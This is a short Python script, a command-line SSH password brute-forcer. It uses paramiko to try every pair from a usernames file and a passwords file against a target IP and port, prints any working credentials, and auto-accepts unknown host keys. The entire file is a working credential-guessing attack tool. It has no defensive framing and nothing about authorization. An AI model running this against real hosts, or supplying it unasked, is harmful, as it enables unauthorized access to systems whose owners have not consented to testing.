import paramiko
import argparse

def ssh_connect(target, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"SSH error occurred: {e}")
        return False
    except paramiko.ssh_exception.NoValidConnectionsError as e:
        print(f"Unable to establish SSH connection: {e}")
        return False
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return False

def bruteforce_ssh(target, port, usernames, passwords):
    try:
        with open(usernames, 'r') as users_file:
            with open(passwords, 'r') as passwords_file:
                for username in users_file:
                    username = username.strip()
                    passwords_file.seek(0)

                    for password in passwords_file:
                        password = password.strip()

                        if ssh_connect(target, port, username, password):
                            print(f"Credentials found: {username}:{password}")
                            return

        print("No matching credentials found.")
    except FileNotFoundError:
        print("File not found.")
    except PermissionError:
        print("Insufficient permissions to read the file.")
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description="SSH Password Bruteforcer")
    parser.add_argument("-i", "--ip", dest="target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-u", "--users", help="Location of the usernames file")
    parser.add_argument("-pw", "--passwords", help="Location of the passwords file")
    args = parser.parse_args()

    if args.target is None:
        parser.error("Please provide the target IP address using the -i or --ip option.")

    bruteforce_ssh(args.target, args.port, args.users, args.passwords)

if __name__ == "__main__":
    main()
